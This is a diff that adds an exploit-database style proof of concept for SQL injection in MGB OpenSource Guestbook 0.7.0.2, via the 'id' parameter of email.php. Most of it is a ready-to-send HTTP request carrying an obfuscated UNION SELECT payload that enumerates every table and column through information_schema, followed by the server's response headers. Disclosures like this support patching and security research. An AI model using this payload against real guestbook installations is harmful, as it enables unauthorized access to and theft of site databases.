@@ -1,0 +1,35 @@
+# Exploit Title: MGB OpenSource Guestbook 0.7.0.2 - 'id' SQL Injection
+# Dork: N/A
+# Date: 2018-10-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.m-gb.org/
+# Software Link: https://sourceforge.net/projects/mopzz-gb/files/latest/download
+# Version: 0.7.0.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/email.php?id=[SQL]
+ 
+GET /[PATH]/email.php?id=admin%27++uniOn+selEct+(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)%2c%32%2c%33%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Tue, 23 Oct 2018 15:50:23 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Set-Cookie: newentry=rjic8lu5atciee1fsacguocub3; path=/
+Set-Cookie: newentry=jd795jb06ni96fqhir90cahhp7; path=/
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
